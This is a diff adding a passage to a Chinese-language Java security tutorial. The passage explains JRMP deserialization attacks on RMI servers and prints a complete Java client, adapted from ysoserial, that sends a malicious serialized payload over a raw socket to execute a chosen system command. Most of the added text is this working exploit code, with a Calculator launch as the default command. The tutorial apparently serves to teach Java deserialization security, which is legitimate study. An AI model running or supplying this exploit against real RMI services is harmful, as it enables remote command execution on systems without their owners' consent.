@@ -402,5 +402,104 @@ public class RMIExploit {
 1. `JRMP协议(Java Remote Message Protocol)`，`RMI`专用的`Java远程消息交换协议`。
 2. `IIOP协议(Internet Inter-ORB Protocol)` ，基于 `CORBA` 实现的对象请求代理协议。
 
+由于`RMI`数据通信大量的使用了`Java`的对象反序列化，所以在使用`RMI客户端`去攻击`RMI服务端`时需要特别小心，如果本地`RMI客户端`刚好符合反序列化攻击的利用条件，那么`RMI服务端`返回一个恶意的反序列化攻击包可能会导致我们被反向攻击。
 
+我们可以通过和`RMI服务`端建立`Socket`连接并使用`RMI`的`JRMP`协议发送恶意的序列化包，`RMI服务端`在处理`JRMP`消息时会反序列化消息对象，从而实现`RCE`。
 
+**JRMP客户端反序列化攻击示例代码：**
+
+```java
+package com.anbai.sec.rmi;
+
+import sun.rmi.server.MarshalOutputStream;
+import sun.rmi.transport.TransportConstants;
+
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+import static com.anbai.sec.rmi.RMIServerTest.RMI_HOST;
+import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;
+
+/**
+ * 利用RMI的JRMP协议发送恶意的序列化包攻击示例，该示例采用Socket协议发送序列化数据，不会反序列化RMI服务器端的数据，
+ * 所以不用担心本地被RMI服务端通过构建恶意数据包攻击，示例程序修改自ysoserial的JRMPClient：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java
+ */
+public class JRMPExploit {
+
+   public static void main(String[] args) throws IOException {
+      if (args.length == 0) {
+         // 如果不指定连接参数默认连接本地RMI服务
+         args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), "open -a Calculator.app"};
+      }
+
+      // 远程RMI服务IP
+      final String host = args[0];
+
+      // 远程RMI服务端口
+      final int port = Integer.parseInt(args[1]);
+
+      // 需要执行的系统命令
+      final String command = args[2];
+
+      // Socket连接对象
+      Socket socket = null;
+
+      // Socket输出流
+      OutputStream out = null;
+
+      try {
+         // 创建恶意的Payload对象
+         Object payloadObject = RMIExploit.genPayload(command);
+
+         // 建立和远程RMI服务的Socket连接
+         socket = new Socket(host, port);
+         socket.setKeepAlive(true);
+         socket.setTcpNoDelay(true);
+
+         // 获取Socket的输出流对象
+         out = socket.getOutputStream();
+
+         // 将Socket的输出流转换成DataOutputStream对象
+         DataOutputStream dos = new DataOutputStream(out);
+
+         // 创建MarshalOutputStream对象
+         ObjectOutputStream baos = new MarshalOutputStream(dos);
+
+         // 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象
+         dos.writeInt(TransportConstants.Magic);// 魔数
+         dos.writeShort(TransportConstants.Version);// 版本
+         dos.writeByte(TransportConstants.SingleOpProtocol);// 协议类型
+         dos.write(TransportConstants.Call);// RMI调用指令
+         baos.writeLong(2); // DGC
+         baos.writeInt(0);
+         baos.writeLong(0);
+         baos.writeShort(0);
+         baos.writeInt(1); // dirty
+         baos.writeLong(-669196253586618813L);// 接口Hash值
+
+         // 写入恶意的序列化对象
+         baos.writeObject(payloadObject);
+
+         dos.flush();
+      } catch (Exception e) {
+         e.printStackTrace();
+      } finally {
+         // 关闭Socket输出流
+         if (out != null) {
+            out.close();
+         }
+
+         // 关闭Socket连接
+         if (socket != null) {
+            socket.close();
+         }
+      }
+   }
+
+}
+```
+
+测试流程同上面的`RMIExploit`，这里不再赘述。
